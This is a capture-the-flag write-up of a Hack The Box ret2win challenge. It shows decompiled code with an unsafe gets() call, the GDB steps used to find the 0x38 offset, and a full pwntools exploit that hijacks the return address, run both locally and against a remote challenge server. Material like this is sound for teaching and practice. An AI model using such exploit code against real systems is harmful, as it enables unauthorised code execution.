### Binary Exploitation

### Source: HTB

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ chmod +rx reg 
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ file reg
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ checksec reg     
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/reg/reg'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

We are working with a x64 binary and the protection enabled is just NX (No-Execute) so we won't be able to put shellcode in the stack and execute it

I'll run it to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ ./reg
Enter your name : pwner
Registered!
```

Asks for a name and prints registered

Decompiling using ghidra

```
undefined8 main(void)

{
  run();
  return 0;
}
```

Main function calls run 

Decompiled run function

```
void run(void)

{
  char local_38 [48];
  
  initialize();
  printf("Enter your name : ");
  gets(local_38);
  puts("Registered!");
  return;
}
```

Cool it prints out enter your name then recevies our input using get (which is a vuln to buffer overflow) then prints registered

Theres a win function called winner

```

void winner(void)

{
  char local_418 [1032];
  FILE *local_10;
  
  puts("Congratulations!");
  local_10 = fopen("flag.txt","r");
  fgets(local_418,0x400,local_10);
  puts(local_418);
  fclose(local_10);
  return;
}
```

It basically prints the flag out

So with this we know that its a basic ret2win chall

Here's what i'll do

```
1. Get the offset
2. Write the exploit
```

To get the offset i'll hop on to gdb

And set a breakpoint on the leave call i.e run+65

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ gdb -q reg
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from reg...
(No debugging symbols found in reg)
gef➤  b *run+65
Breakpoint 1 at 0x4012ab
gef➤  r
Starting program: /home/mark/Desktop/BofLearn/Challs/HTB/reg/reg 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your name : pwner
Registered!

Breakpoint 1, 0x00000000004012ab in run ()


[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xc               
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2c0  →  "/home/mark/Desktop/BofLearn/Challs/HTB/reg/reg"
$rcx   : 0x007ffff7ec10d0  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffde10  →  0x000072656e7770 ("pwner"?)
$rbp   : 0x007fffffffde40  →  0x007fffffffde50  →  0x0000000000000001
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da10  →  0x0000000000000000
$rip   : 0x000000004012ab  →  <run+65> leave 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7dd2fd8  →  0x10002200006647 ("Gf"?)
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2ef  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde10│+0x0000: 0x000072656e7770 ("pwner"?)    ← $rsp
0x007fffffffde18│+0x0008: 0x0000000000000000
0x007fffffffde20│+0x0010: 0x0000000000000000
0x007fffffffde28│+0x0018: 0x0000000000000000
0x007fffffffde30│+0x0020: 0x0000000000000000
0x007fffffffde38│+0x0028: 0x007ffff7fe6e10  →  <dl_main+0> push rbp
0x007fffffffde40│+0x0030: 0x007fffffffde50  →  0x0000000000000001        ← $rbp
0x007fffffffde48│+0x0038: 0x000000004012bb  →  <main+14> mov eax, 0x0
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40129e <run+52>         lea    rdi, [rip+0xd8e]        # 0x402033
     0x4012a5 <run+59>         call   0x401030 <puts@plt>
     0x4012aa <run+64>         nop    
 →   0x4012ab <run+65>         leave  
     0x4012ac <run+66>         ret    
     0x4012ad <main+0>         push   rbp
     0x4012ae <main+1>         mov    rbp, rsp
     0x4012b1 <main+4>         mov    eax, 0x0
     0x4012b6 <main+9>         call   0x40126a <run>
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "reg", stopped 0x4012ab in run (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012ab → run()
[#1] 0x4012bb → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Now i'll search for my input in the stack and the rip 

```
gef➤  search-pattern pwner
[+] Searching 'pwner' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde10 - 0x7fffffffde15  →   "pwner" 
gef➤  i f
Stack level 0, frame at 0x7fffffffde50:
 rip = 0x4012ab in run; saved rip = 0x4012bb
 called by frame at 0x7fffffffde60
 Arglist at 0x7fffffffde40, args: 
 Locals at 0x7fffffffde40, Previous frame's sp is 0x7fffffffde50
 Saved registers:
  rbp at 0x7fffffffde40, rip at 0x7fffffffde48
gef➤ 
```

Doing the math i get the offset 

```
└─$ python3
Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x7fffffffde48-0x7fffffffde10)
'0x38'
>>> 
```

Now time to write the exploit

So basically what the exploit will do is to overwrite the return address to call the winner function

Here's the exploit

```
from pwn import *

io = process('./reg')
elf = ELF('./reg')

payload = ""
payload += "A"*0x38
payload += p64(elf.symbols['winner'])

io.sendlineafter(b':', payload)
io.interactive()

```

On running it

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ python2 exploit.py  
[+] Starting local process './reg': pid 258349
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/reg/reg'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
 Registered!
Congratulations!
FLAG{F4K3_Fl4G_F0R_T3ST1NG}

[*] Got EOF while reading in interactive
$ 
[*] Process './reg' stopped with exit code -11 (SIGSEGV) (pid 258349)
[*] Got EOF while sending in interactive
```

So now i'll run it on the remote server

Here's the modified exploit

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ cat exploit.py 
from pwn import *

io = remote('165.232.98.94', 31233)
#io = process('./reg')
elf = ELF('./reg')

payload = ""
payload += "A"*0x38
payload += p64(elf.symbols['winner'])

io.sendlineafter(b':', payload)
io.interactive()
```

On running it

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/reg]
└─$ python2 exploit.py
[+] Opening connection to 165.232.98.94 on port 31233: Done
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/reg/reg'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
 Registered!
Congratulations!
HTB{N3W_70_pWn}

[*] Got EOF while reading in interactive
[*] Closed connection to 165.232.98.94 port 31233
```

And we're done

<br> <br> 
[Back To Home](../../index.md)
